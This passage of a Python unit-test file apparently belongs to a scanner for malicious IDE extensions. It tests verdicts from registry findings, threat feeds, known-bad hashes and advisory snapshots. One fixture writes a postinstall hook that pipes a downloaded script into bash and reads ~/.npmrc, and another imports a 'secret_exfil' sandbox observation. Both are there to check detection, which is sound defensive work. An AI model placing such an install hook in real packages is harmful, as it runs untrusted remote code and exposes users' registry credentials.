            targets = discover_from_path(root)

        self.assertEqual(targets, [{"type": "vsix", "path": str(vsix.resolve())}])

    def test_exact_registry_finding_moves_clean_extension_to_review(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "trusted.trusted-formatter",
                "severity": "MEDIUM",
                "confidence": 0.58,
                "category": "dependency",
                "rule_id": "vulnerable-npm-dependency",
                "evidence_summary": "example@1.0.0 has 1 OSV finding(s). Version match: exact.",
                "evidence": {"package": "example", "version": "1.0.0", "exact": True, "osv_ids": ["GHSA-test"]},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(include_fixtures=True, online=True)

        by_id = {extension["extension_id"]: extension for extension in report["extensions"]}
        formatter = by_id["trusted.trusted-formatter"]
        self.assertEqual(formatter["verdict"], "review")
        self.assertEqual(formatter["severity"], "MEDIUM")
        self.assertEqual(formatter["malware_score"], 0)
        self.assertGreater(formatter["risk_score"], 0)
        self.assertIn("vulnerable-npm-dependency", {finding["rule_id"] for finding in formatter["findings"]})

    def test_registry_intelligence_can_be_replayed_without_network_drift(self) -> None:
        registry = {
            "enabled": True,
            "mode": "batched",
            "findings": [{
                "extension_id": "trusted.trusted-formatter",
                "severity": "HIGH",
                "confidence": 0.82,
                "category": "dependency",
                "rule_id": "vulnerable-npm-dependency",
                "evidence_summary": "example@1.0.0 has 1 OSV finding(s). Version match: exact.",
                "evidence": {
                    "package": "example",
                    "version": "1.0.0",
                    "exact": True,
                    "osv_ids": ["GHSA-test"],
                    "rating_average": 5.0,
                },
            }],
            "errors": [],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            live = scan_targets(include_fixtures=True, online=True)

        with TemporaryDirectory() as tmp:
            snapshot = Path(tmp) / "report.json"
            snapshot.write_text(json.dumps({
                "scan": {"intelligence_snapshot": live["intelligence"]},
            }), encoding="utf-8")
            with patch("ide_scanner.scanner.enrich_registry", side_effect=AssertionError("network enrichment ran")):
                replay = scan_targets(include_fixtures=True, online=False, registry_snapshot_file=snapshot)

        live_by_id = {item["extension_id"]: item for item in live["extensions"]}
        replay_by_id = {item["extension_id"]: item for item in replay["extensions"]}
        self.assertEqual(
            (live_by_id["trusted.trusted-formatter"]["decision"], live_by_id["trusted.trusted-formatter"]["severity"]),
            (replay_by_id["trusted.trusted-formatter"]["decision"], replay_by_id["trusted.trusted-formatter"]["severity"]),
        )
        self.assertEqual(live["intelligence"]["registry"]["sha256"], replay["intelligence"]["registry"]["sha256"])
        self.assertEqual(replay["intelligence"]["registry"]["source"], "replay")
        self.assertEqual(live["intelligence"]["registry"]["payload"]["findings"][0]["evidence"]["rating_average"], 5)

    def test_registry_snapshot_rejects_tampered_contents(self) -> None:
        with TemporaryDirectory() as tmp:
            snapshot = Path(tmp) / "registry.json"
            snapshot.write_text(json.dumps({
                "enabled": True,
                "mode": "batched",
                "findings": [],
                "errors": [],
                "snapshot": {"sha256": "0" * 64},
            }), encoding="utf-8")

            with patch(
                "ide_scanner.scanner.scan_extension",
                side_effect=AssertionError("artifact scanning must not start"),
            ):
                with self.assertRaisesRegex(ValueError, "digest does not match"):
                    scan_targets(include_fixtures=True, registry_snapshot_file=snapshot)

    def test_registry_only_extension_id_can_be_marked_malicious(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "bad.bad-extension",
                "severity": "CRITICAL",
                "confidence": 0.96,
                "category": "registry",
                "rule_id": "marketplace-removed-package",
                "evidence_summary": "Extension appears in Microsoft's removed package list as Malware.",
                "evidence": {"date": "1/1/2026", "type": "Malware"},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(extension_ids=["bad.bad-extension"], online=True)

        extension = report["extensions"][0]
        self.assertEqual(extension["source"], "registry-id")
        self.assertEqual(extension["verdict"], "malicious")
        self.assertEqual(extension["malware_authority"], "authoritative")
        self.assertEqual(extension["malware_score"], 100)
        self.assertEqual(extension["findings"][0]["evidence"]["evidence_class"], "confirmed")

    def test_non_malware_marketplace_removal_is_not_authoritative_malware(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "removed.impersonator",
                "severity": "HIGH",
                "confidence": 0.9,
                "category": "registry",
                "rule_id": "marketplace-removed-package",
                "evidence_summary": "Extension appears in Microsoft's removed package list as Impersonation.",
                "evidence": {"date": "1/1/2026", "type": "Impersonation"},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(extension_ids=["removed.impersonator"], online=True)

        extension = report["extensions"][0]
        self.assertEqual(extension["verdict"], "review")
        self.assertEqual(extension["malware_authority"], "none")
        self.assertEqual(extension["malware_score"], 0)
        self.assertGreaterEqual(extension["risk_score"], 80)
        self.assertEqual(extension["severity"], "HIGH")
        self.assertEqual(extension["score_details"]["basis"], "provenance")
        self.assertEqual(extension["findings"][0]["evidence"]["evidence_class"], "provenance")

    def test_suspicious_marketplace_removal_is_suspicious_not_authoritative(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "removed.suspicious",
                "severity": "CRITICAL",
                "confidence": 0.96,
                "category": "registry",
                "rule_id": "marketplace-removed-package",
                "evidence_summary": "Extension appears in Microsoft's removed package list as Suspicious.",
                "evidence": {"date": "1/1/2026", "type": "Suspicious"},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(extension_ids=["removed.suspicious"], online=True)

        extension = report["extensions"][0]
        self.assertEqual(extension["verdict"], "suspicious")
        self.assertEqual(extension["malware_authority"], "non_authoritative")
        self.assertEqual(extension["malware_score"], 0)
        self.assertGreaterEqual(extension["risk_score"], 88)

    def test_marketplace_reputation_only_does_not_move_clean_extension_to_review(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "trusted.trusted-formatter",
                "severity": "LOW",
                "confidence": 0.46,
                "category": "reputation",
                "rule_id": "marketplace-unverified-publisher",
                "evidence_summary": "Marketplace metadata does not report a verified publisher.",
                "evidence": {"publisher_verified": False, "install_count": 10},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(include_fixtures=True, online=True)

        formatter = {extension["extension_id"]: extension for extension in report["extensions"]}["trusted.trusted-formatter"]
        self.assertEqual(formatter["verdict"], "clean")
        self.assertEqual(formatter["malware_score"], 0)
        self.assertEqual(formatter["risk_score"], 0)
        self.assertEqual(formatter["findings"][0]["evidence"]["evidence_class"], "reputation")
        self.assertEqual(formatter["score_details"]["components"]["reputation"], 8)

    def test_verified_publisher_is_reported_as_suppressor_only(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "example.agent-toolbox",
                "severity": "INFO",
                "confidence": 0.95,
                "category": "reputation",
                "rule_id": "marketplace-verified-publisher",
                "evidence_summary": "Marketplace metadata reports a verified publisher.",
                "evidence": {"publisher_verified": True, "install_count": 100000},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(include_fixtures=True, online=True)

        agent = {extension["extension_id"]: extension for extension in report["extensions"]}["example.agent-toolbox"]
        self.assertEqual(agent["verdict"], "clean")
        self.assertEqual(agent["malware_score"], 0)
        self.assertIn("verified-publisher", {item["id"] for item in agent["score_details"]["suppressors"]})

    def test_marketplace_metadata_findings_are_contextual(self) -> None:
        findings = _marketplace_metadata_findings("example.low", {
            "extension_id": "example.low",
            "found": True,
            "publisher_verified": False,
            "install_count": 5,
            "rating_average": 2.0,
            "rating_count": 8,
            "last_updated": "2020-01-01T00:00:00Z",
        })

        rule_ids = {finding["rule_id"] for finding in findings}
        self.assertIn("marketplace-unverified-publisher", rule_ids)
        self.assertIn("marketplace-low-install-count", rule_ids)
        self.assertIn("marketplace-low-rating", rule_ids)
        self.assertIn("marketplace-stale-extension", rule_ids)

    def test_name_impersonation_metric_is_reputation_context(self) -> None:
        findings = _marketplace_metadata_findings("random.chatgpt", {
            "extension_id": "random.chatgpt",
            "found": True,
            "publisher": "random",
            "publisher_verified": False,
            "extension_name": "chatgpt",
            "display_name": "ChatGPT",
            "install_count": 12,
            "rating_average": 0,
            "rating_count": 0,
        })

        impersonation = [finding for finding in findings if finding["rule_id"] == "marketplace-name-impersonation"]
        self.assertEqual(len(impersonation), 1)
        self.assertEqual(impersonation[0]["category"], "reputation")

    def test_repository_metadata_is_reputation_context(self) -> None:
        findings = _repository_metadata_findings("example.repo", {
            "repository": "https://github.com/example/repo",
            "found": True,
            "host": "github",
            "full_name": "example/repo",
            "archived": True,
            "disabled": False,
            "pushed_at": "2020-01-01T00:00:00Z",
        })

        self.assertIn("repo-archived", {finding["rule_id"] for finding in findings})
        self.assertIn("repo-stale", {finding["rule_id"] for finding in findings})
        self.assertTrue(all(finding["category"] == "reputation" for finding in findings))

    def test_dev_dependencies_are_not_report_dependencies(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"dev-only","version":"1.0.0",'
                '"devDependencies":{"webpack":"5.75.0"}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.dependencies, {})

    def test_package_lock_resolves_exact_runtime_dependencies(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"locked","version":"1.0.0",'
                '"dependencies":{"left-pad":"^1.0.0"}}',
                encoding="utf-8",
            )
            (root / "package-lock.json").write_text(
                '{"lockfileVersion":3,"packages":{'
                '"":{"dependencies":{"left-pad":"^1.0.0"}},'
                '"node_modules/left-pad":{"version":"1.3.0"},'
                '"node_modules/transitive":{"version":"2.4.0"},'
                '"node_modules/dev-only":{"version":"9.9.9","dev":true}'
                '}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.dependencies["left-pad"], "1.3.0")
        self.assertEqual(report.dependencies["transitive"], "2.4.0")
        self.assertNotIn("dev-only", report.dependencies)

    def test_node_modules_resolves_manifest_range_when_no_lockfile_exists(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"installed","version":"1.0.0",'
                '"dependencies":{"@scope/pkg":"^2.0.0"}}',
                encoding="utf-8",
            )
            installed = root / "node_modules" / "@scope" / "pkg"
            installed.mkdir(parents=True)
            (installed / "package.json").write_text('{"name":"@scope/pkg","version":"2.1.5"}', encoding="utf-8")

            report = scan_extension(root)

        self.assertEqual(report.dependencies["@scope/pkg"], "2.1.5")

    def test_mutable_and_unpinned_dependency_sources_are_low_hardening_notes(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"deps","version":"1.0.0",'
                '"dependencies":{"floating":"latest","remote":"git+https://github.com/example/pkg.git"}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.severity, "LOW")
        self.assertEqual(report.malware_score, 0)
        self.assertGreater(report.risk_score, 0)
        self.assertIn("unpinned-dependency", {finding.rule_id for finding in report.findings})
        self.assertIn("mutable-dependency-source", {finding.rule_id for finding in report.findings})

    def test_install_time_chains_are_suspicious(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"installer","version":"1.0.0",'
                '"scripts":{"postinstall":"curl https://example.com/payload.sh | bash && cat ~/.npmrc"}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "suspicious")
        self.assertEqual(report.malware_authority, "non_authoritative")
        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("install-download-execute", rule_ids)
        self.assertIn("install-secret-access", rule_ids)
        self.assertIn("install-shell-obfuscation", rule_ids)

    def test_registry_url_environment_assignment_is_not_install_download(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"registry-auth","version":"1.0.0",'
                '"scripts":{"preinstall":"npm_config_registry=https://registry.npmjs.org npm exec ado-npm-auth"}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.decision, "allow")
        self.assertNotIn("install-download-execute", rule_ids)

    def test_credential_command_activation_is_contextual_surface(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"account","version":"1.0.0",'
                '"activationEvents":["onCommand:example.login","onCommand:example.format"]}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        credential_findings = [
            finding for finding in report.findings if finding.rule_id == "credential-command-registration"
        ]
        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.decision, "allow")
        self.assertEqual(len(credential_findings), 1)
        self.assertEqual(credential_findings[0].evidence["command"], "example.login")

    def test_agent_tool_schema_metrics_are_contextual_capabilities(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"agentic","version":"1.0.0",'
                '"contributes":{"languageModelTools":[{"name":"runCommand","description":"execute shell command and read workspace files via https url"}]}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.malware_score, 0)
        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("agent-shell-tool", rule_ids)
        self.assertIn("agent-filesystem-tool", rule_ids)
        self.assertIn("agent-network-tool", rule_ids)

    def test_startup_activation_alone_is_context_not_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"startup-theme","version":"1.0.0",'
                '"activationEvents":["onStartupFinished"],"contributes":{"themes":[]}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.malware_score, 0)
        self.assertEqual(report.risk_score, 0)
        self.assertEqual(report.score_details["risk_score"], 0)
        self.assertEqual(report.score_details["basis"], "none")
        self.assertIn("startup-activation", {finding.rule_id for finding in report.findings})

    def test_activation_and_standard_ide_contributions_are_context_not_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"debugger","version":"1.0.0",'
                '"activationEvents":["onDebug"],"contributes":{"debuggers":[]}}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.risk_score, 0)
        self.assertIn("sensitive-activation", {finding.rule_id for finding in report.findings})
        self.assertIn("powerful-ide-contribution", {finding.rule_id for finding in report.findings})

    def test_dangerous_repository_workflow_is_low_hardening_evidence(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            workflows = root / ".github" / "workflows"
            workflows.mkdir(parents=True)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"workflow","version":"1.0.0","repository":"https://github.com/example/workflow"}',
                encoding="utf-8",
            )
            (workflows / "ci.yml").write_text(
                "on: pull_request_target\npermissions: write-all\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.severity, "LOW")
        self.assertIn("dangerous-github-workflow", {finding.rule_id for finding in report.findings})

    def test_sandbox_observations_are_imported_as_suspicious(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            extension = root / "observed"
            extension.mkdir()
            (extension / "package.json").write_text(
                '{"publisher":"example","name":"observed","version":"1.0.0"}',
                encoding="utf-8",
            )
            observations = root / "observations.json"
            observations.write_text(
                '{"extensions":{"example.observed":[{"kind":"secret_exfil","destination":"https://example.com"}]}}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[root], sandbox_observations_file=observations)

        scanned = report["extensions"][0]
        self.assertEqual(scanned["verdict"], "suspicious")
        self.assertEqual(scanned["malware_authority"], "non_authoritative")
        self.assertIn("observed-secret-exfil", {finding["rule_id"] for finding in scanned["findings"]})
        self.assertEqual(report["privacy_mode"], "local-metadata-static-features-plus-controlled-runtime")
        self.assertEqual(report["intelligence"]["dynamic_sandbox"]["status"], "imported")
        self.assertEqual(
            scanned["analysis_coverage"]["providers"]["dynamic_sandbox"]["status"],
            "imported",
        )

    def test_artifact_inventory_flags_native_and_packed_artifacts(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"artifacts","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "server.node").write_bytes(b"native")
            (root / "payload.zip").write_bytes(b"packed")
            (root / "payload-two.zip").write_bytes(b"packed-two")
            (root / "payload-three.zip").write_bytes(b"packed-three")

            report = scan_extension(root)

        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.malware_score, 0)
        self.assertGreater(report.risk_score, 0)
        self.assertEqual(report.artifact_inventory["files_hashed"], 5)
        self.assertEqual(len(report.artifact_inventory["risky_artifacts"]), 4)
        self.assertIn("native-or-packed-artifact", {finding.rule_id for finding in report.findings})
        self.assertIn("packed-artifact", {finding.rule_id for finding in report.findings})
        packed = [finding for finding in report.findings if finding.rule_id == "packed-artifact"]
        self.assertEqual(len(packed), 1)
        self.assertEqual(packed[0].evidence["count"], 3)
        self.assertEqual(len(packed[0].file_refs), 3)

    def test_wasm_requires_runtime_and_only_visible_loaders_emit_context(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp) / "extension"
            root.mkdir()
            (root / "package.json").write_text(
                '{"publisher":"example","name":"wasm-tool","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "module.wasm").write_bytes(b"\x00asm\x01\x00\x00\x00")
            (root / "extension.js").write_text(
                "module.exports.activate = async () => WebAssembly.instantiate(new Uint8Array());",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        capability_ids = {str(item.get("id")) for item in report.capabilities}
        self.assertIn("wasm-loader", rule_ids)
        self.assertIn("wasm_runtime", capability_ids)
        self.assertTrue(_runtime_required_for_report(report))

    def test_wasm_without_a_loader_is_capability_context_only(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp) / "extension"
            root.mkdir()
            (root / "package.json").write_text(
                '{"publisher":"example","name":"wasm-data","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "module.wasm").write_bytes(b"\x00asm\x01\x00\x00\x00")

            report = scan_extension(root)

        self.assertNotIn("wasm-loader", {finding.rule_id for finding in report.findings})
        self.assertIn("wasm_runtime", {str(item.get("id")) for item in report.capabilities})

    def test_declared_activation_entrypoint_without_sensitive_labels_still_requires_runtime(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp) / "extension"
            root.mkdir()
            (root / "package.json").write_text(
                '{"publisher":"example","name":"ordinary-runtime","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text("module.exports.activate = () => {};", encoding="utf-8")

            report = scan_extension(root)

        self.assertTrue(report.analysis_coverage["declared_entrypoints"])
        self.assertTrue(_runtime_required_for_report(report))

    def test_declared_activation_entrypoint_with_network_label_requires_runtime(self) -> None:
        report = MagicMock()
        report.capabilities = [{"id": "network", "evidence": ["extension.js"]}]
        self.assertTrue(_runtime_required_for_report(report))

    def test_known_bad_hash_feed_is_authoritative_malware(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            extension = root / "bad-extension"
            extension.mkdir()
            (extension / "package.json").write_text(
                '{"publisher":"bad","name":"extension","version":"1.0.0"}',
                encoding="utf-8",
            )
            payload = b"known bad payload"
            (extension / "extension.js").write_bytes(payload)
            digest = hashlib.sha256(payload).hexdigest()
            feed = root / "known-bad.json"
            feed.write_text(
                '{"hashes":[{"sha256":"' + digest + '","source":"unit-test","classification":"malware"}]}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[root], known_bad_hashes_file=feed)

        scanned = report["extensions"][0]
        self.assertEqual(scanned["verdict"], "malicious")
        self.assertEqual(scanned["malware_authority"], "authoritative")
        self.assertEqual(scanned["malware_score"], 100)
        self.assertIn("known-bad-artifact", {finding["rule_id"] for finding in scanned["findings"]})

    def test_configured_intelligence_feed_failures_do_not_degrade_to_empty_feeds(self) -> None:
        with TemporaryDirectory() as tmp:
            missing = Path(tmp) / "missing-feed.json"
            with self.assertRaisesRegex(ValueError, "known-bad hash feed could not be read"):
                _load_known_bad_hashes(missing)
            with self.assertRaisesRegex(ValueError, "threat feed could not be read"):
                _load_threat_feed(missing)

            malformed_hashes = Path(tmp) / "malformed-hashes.json"
            malformed_hashes.write_text('{"hashes": []}', encoding="utf-8")
            with self.assertRaisesRegex(ValueError, "no valid SHA-256 hashes"):
                _load_known_bad_hashes(malformed_hashes)

            malformed_threats = Path(tmp) / "malformed-threats.json"
            malformed_threats.write_text('{"extensions": []}', encoding="utf-8")
            with self.assertRaisesRegex(ValueError, "no valid extension entries"):
                _load_threat_feed(malformed_threats)

    def test_threat_feed_extension_id_is_authoritative_malware(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            extension = root / "bad-extension"
            extension.mkdir()
            (extension / "package.json").write_text(
                '{"publisher":"bad","name":"extension","version":"1.0.0"}',
                encoding="utf-8",
            )
            feed = root / "threat-feed.json"
            feed.write_text(
                '{"extensions":[{"extension_id":"bad.extension","classification":"malware","source":"unit-test"}]}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[root], threat_feed_file=feed)

        scanned = report["extensions"][0]
        self.assertEqual(scanned["verdict"], "malicious")
        self.assertEqual(scanned["malware_authority"], "authoritative")
        self.assertEqual(scanned["malware_score"], 100)
        self.assertIn("trusted-threat-feed-hit", {finding["rule_id"] for finding in scanned["findings"]})

    def test_exact_extension_advisory_blocks_without_calling_artifact_malware(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp) / "extension"
            root.mkdir()
            (root / "package.json").write_text(
                '{"publisher":"example","name":"vulnerable","version":"1.2.3","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text("module.exports = {};", encoding="utf-8")
            artifact_hash = scan_extension(root).artifact_hash
            feed = Path(tmp) / "advisories.json"
            feed.write_text(json.dumps({
                "snapshot_version": "unit-test.1",
                "entries": [{
                    "extension_id": "example.vulnerable",
                    "version": "1.2.3",
                    "artifact_sha256": artifact_hash,
                    "advisory_id": "CVE-TEST-1",
                    "severity": "HIGH",
                    "policy_action": "block",
                    "source": "https://example.invalid/CVE-TEST-1",
                }],
            }), encoding="utf-8")

            report = scan_targets(paths=[root], extension_advisories_file=feed)

        scanned = report["extensions"][0]
        self.assertEqual(scanned["decision"], "block")
        self.assertEqual(scanned["severity"], "HIGH")
        self.assertEqual(scanned["verdict"], "review")
        self.assertEqual(scanned["malware_score"], 0)
        self.assertIn("known-vulnerable-extension", {finding["rule_id"] for finding in scanned["findings"]})
        self.assertEqual(report["intelligence"]["extension_advisories"]["snapshot_version"], "unit-test.1")

    def test_exact_malicious_extension_advisory_is_confirmed_malware(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp) / "extension"
            root.mkdir()
            (root / "package.json").write_text(
                '{"publisher":"example","name":"compromised","version":"1.2.3","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text("module.exports = {};", encoding="utf-8")
            artifact_hash = scan_extension(root).artifact_hash
            feed = Path(tmp) / "advisories.json"
            feed.write_text(json.dumps({
                "snapshot_version": "unit-test.2",
                "entries": [{
                    "extension_id": "example.compromised",
                    "version": "1.2.3",
                    "artifact_sha256": artifact_hash,
                    "advisory_id": "MALWARE-TEST-1",
                    "severity": "CRITICAL",
                    "policy_action": "block",
                    "threat_classification": "malicious",
                    "source": "https://example.invalid/MALWARE-TEST-1",
                }],
            }), encoding="utf-8")

            report = scan_targets(paths=[root], extension_advisories_file=feed)

        scanned = report["extensions"][0]
        self.assertEqual(scanned["decision"], "block")
        self.assertEqual(scanned["verdict"], "malicious")
        self.assertEqual(scanned["malware_authority"], "authoritative")
        self.assertEqual(scanned["malware_score"], 100)
        self.assertEqual(scanned["public_outcome"], "confirmed_threat")
        finding = next(item for item in scanned["findings"] if item["rule_id"] == "known-malicious-extension")
        self.assertEqual(finding["evidence_class"], "confirmed")

    def test_bundled_advisory_snapshot_contains_exact_glasswasm_artifacts(self) -> None:
        from ide_scanner.scanner import _load_extension_advisories

        bundle = _load_extension_advisories()
        entries = {
            (entry["extension_id"], entry["version"]): entry
            for entry in bundle["entries"]
        }
        self.assertEqual(
            entries[("noellee-doc.flint-debug", "0.1.1")]["artifact_sha256"],
            "3aa31999398e7f80231c03d7137ffdb554a84b83dbcffc59ce16c9a65f9e5d58",
        )
        self.assertEqual(
            entries[("exargd.vsblack", "0.0.1")]["artifact_sha256"],
            "1e283327ad048bea39f4a8501770858a20f3555e87fe3e202274f2e87f8a3c25",
        )
        self.assertEqual(
            entries[("bingcha.bcai-tools", "4.0.37")]["artifact_sha256"],
            "b1b9785cdc7be479061f121f282391fba9be013d896d9a54f395621634709216",
        )
        self.assertEqual(
            entries[("nrwl.angular-console", "18.95.0")]["artifact_sha256"],
            "1a4afce34918bdc74ae3f31edaffffaa0ee074d83618f53edfd88137927340b8",
        )
        self.assertEqual(
            entries[("nrwl.angular-console", "18.95.0")]["advisory_id"],
            "GHSA-c9j4-9m59-847w",
        )
        self.assertEqual(
            entries[("nrwl.angular-console", "18.95.0")]["source_secondary"],
            "https://phoenix.security/vs-code-extension-malware-github-breach-teampcp-2026/",
        )
        self.assertEqual(
            entries[("AzureCdnInfo.edrtester", "1.0.4")]["artifact_sha256"],
            "d4101a5bc86747f499ef347548e92eb3e1b09ce6acaf34bd1ee07f66400b18af",
        )
        self.assertEqual(
            entries[("AzureCdnInfo.edrtester", "1.0.4")]["advisory_id"],
            "CLR-2026-3045",
        )

    def test_bundled_advisory_snapshot_contains_independently_reported_backdoors(self) -> None:
        from ide_scanner.scanner import _load_extension_advisories

        entries = {
            (entry["extension_id"].lower(), entry["version"]): entry
            for entry in _load_extension_advisories()["entries"]
        }
        expected = {
            ("doriann612.remote-text-fetcher", "0.0.1"): "8136e6e1260e85c860c26245e7622c8bc2f82d741afb445e9ddccaee78990f4b",
            ("noahbit.api-reactor", "0.0.1"): "ca272b481f630635cd059f85321dbc7be372e75820536ccbfd29dfcf571ab45c",
            ("koltinsmith.project-restructure-nodejs", "1.0.0"): "366052e4cd801cb4a3fb09376e79288a3d22e820ba21b41d4a07627d8674c6a0",
            ("sunsethightlight.sunset-highlight", "0.0.2"): "217244bbc47e6cd2d24aff82e670d97bb66711ab4edcca44976c42ff2baa56db",
            ("jumbo.jumbokey", "1.0.2"): "9ea98af53a6163497ad92860e60e4c767a72d4199e42ae414876bff469c208bb",
            ("jumbocore.jumbos", "1.0.0"): "63688d7765e52cf9800ea0dfc296bc86a448d241108c17c564709a6a844816fc",
        }
        for key, digest in expected.items():
            self.assertEqual(entries[key]["artifact_sha256"], digest)
            self.assertEqual(entries[key]["policy_action"], "block")

    def test_missing_required_extension_advisory_snapshot_fails_closed(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp) / "extension"
            root.mkdir()
            (root / "package.json").write_text(
                '{"publisher":"example","name":"clean","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text("module.exports = {};", encoding="utf-8")

            report = scan_targets(paths=[root], extension_advisories_file=Path(tmp) / "missing.json")

        scanned = report["extensions"][0]
        self.assertEqual(report["intelligence"]["extension_advisories"]["status"], "unavailable")
        self.assertEqual(scanned["analysis_status"], "incomplete")
        self.assertEqual(scanned["decision"], "incomplete")

    def test_vsix_is_scanned_in_quarantine_and_keeps_source_artifact_hash(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            vsix = root / "sample.vsix"
            with zipfile.ZipFile(vsix, "w") as archive:
                archive.writestr("extension/package.json", '{"publisher":"example","name":"vsix","version":"1.0.0"}')
                archive.writestr("extension/extension.js", "console.log('ok')")

            report = scan_targets(paths=[vsix])

        scanned = report["extensions"][0]
        self.assertEqual(scanned["source"], "vsix")
        self.assertEqual(scanned["install_path"], str(vsix.resolve()))
        self.assertEqual(scanned["verdict"], "clean")
        self.assertEqual(len(scanned["artifact_inventory"]["vsix_hash"]), 64)
        self.assertEqual(scanned["artifact_inventory"]["source_artifact"], "sample.vsix")
        self.assertEqual(scanned["artifact_identity"]["artifact_origin"], "user_uploaded_vsix")
        self.assertFalse(scanned["artifact_identity"]["original_registry_artifact"])
        self.assertEqual(scanned["artifact_inventory"]["vsix_signature"]["present"], False)

    def test_archived_vsix_and_source_snapshot_have_distinct_provenance(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            source = root / "source"
            source.mkdir()
            (source / "package.json").write_text(
                '{"publisher":"example","name":"source","version":"1.0.0"}', encoding="utf-8"
            )
            vsix = root / "archived.vsix"
            with zipfile.ZipFile(vsix, "w") as archive:
                archive.writestr("extension/package.json", '{"publisher":"example","name":"archive","version":"1.0.0"}')

            source_report = scan_targets(paths=[source], path_artifact_origin="source_snapshot")
            archive_report = scan_targets(paths=[vsix], path_artifact_origin="archive_artifact")

        source_identity = source_report["extensions"][0]["artifact_identity"]
        archive_identity = archive_report["extensions"][0]["artifact_identity"]
        self.assertEqual(source_identity["artifact_origin"], "source_snapshot")
        self.assertFalse(source_identity["original_registry_artifact"])
        self.assertEqual(archive_identity["artifact_origin"], "archive_artifact")
        self.assertFalse(archive_identity["original_registry_artifact"])

    def test_incompatible_artifact_origin_is_rejected(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            vsix = root / "sample.vsix"
            vsix.write_bytes(b"not-opened")
